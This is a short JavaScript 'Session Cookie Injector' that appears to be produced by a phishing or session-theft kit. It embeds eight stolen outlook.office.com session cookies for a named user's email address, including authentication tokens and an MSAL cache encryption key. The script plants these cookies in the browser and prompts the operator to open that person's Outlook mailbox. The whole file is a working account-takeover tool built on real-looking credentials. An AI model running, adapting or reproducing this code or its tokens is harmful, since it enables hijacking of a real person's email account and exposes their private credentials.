
// Session Cookie Injector
// Auto-generated on 2025-09-23T10:57:18.994Z
// Session: jaco@smei.co.za (8 cookies)

(function() {
    console.log('🚀 Injecting 8 cookies for session: jaco@smei.co.za');

    const sessionInfo = {
        email: 'jaco@smei.co.za',
        timestamp: '2025-09-23T10:57:18.994Z',
        cookieCount: 8
    };

    console.log('📧 Session info:', sessionInfo);

    const cookies = [
    {
        "name": "SuiteServiceProxyKey",
        "value": "dsB+twBWWWYl+5VtZtz1klLQc1/f1WQ9NuZAc9ACAOM=&BNncGhqfRBXVIfE/lA6OWg==",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 89,
        "httpOnly": false,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "luat",
        "value": "Atduu91g5vzub8Y+7SXqmCF/bHZYD7oyKS/8ooqkS2GFUeXOgJDiHaWTzvct4YHK0K7HRIvue5pQj81n+EIJRAaT/WLHhepqZZ97VrS4sDUlQ3f9ibwR/VYLVs3I9qasJemtGUS0AaJC1m01Sv7o4BVIrnidMAkcDlqEf0FH5JJ1KzJSQGA3TXCa5dxv+/AnY0liDeQl4YhkGzkvREFrL02FKbYYQNDBnsePrT7uFRnY6eev0fHDEH3YvJVQAhuOW7umYjQ1bHdMoZEVPH6IIaxlaljBRygaCyCYY40LAtgnmXNolP0T80ywe2bpG0BzwMdI+zlgRA8NWU5zHSomXA==",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 348,
        "httpOnly": true,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "OWAAppIdType",
        "value": "Exchange",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1761217037.103202,
        "size": 20,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "ClientId",
        "value": "B373BB93CB2A4264A8935431B31089A6",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1790161024.474029,
        "size": 40,
        "httpOnly": false,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "DefaultAnchorMailbox",
        "value": "PUID:1003000088D29CF9@29775c6a-2d6e-42ef-a6ea-3e0a46793619",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 78,
        "httpOnly": false,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "UC",
        "value": "ebbfe2cadd4d4e5ebd76a87d662ed5ad",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 34,
        "httpOnly": true,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "OIDC",
        "value": "1",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": 1774263433.640865,
        "size": 5,
        "httpOnly": true,
        "secure": true,
        "session": false,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    },
    {
        "name": "msal.cache.encryption",
        "value": "%7B%22id%22%3A%2201997638-4bf8-7889-ac25-d71bbbbaab6c%22%2C%22key%22%3A%222T2iEmaDuNmqQoBdBP4ikQ--h6GJKfA8HzjJHwQajXs%22%7D",
        "domain": "outlook.office.com",
        "path": "/",
        "expires": -1,
        "size": 144,
        "httpOnly": false,
        "secure": true,
        "session": true,
        "sameSite": "None",
        "priority": "Medium",
        "sameParty": false,
        "sourceScheme": "Secure"
    }
];
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name);
        }
    });

    console.log('✅ Successfully injected ' + injected + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for jaco@smei.co.za! Open Outlook now?')) {
            window.open('https://outlook.office.com/mail/', '_blank');
        }
    }, 1000);
})();
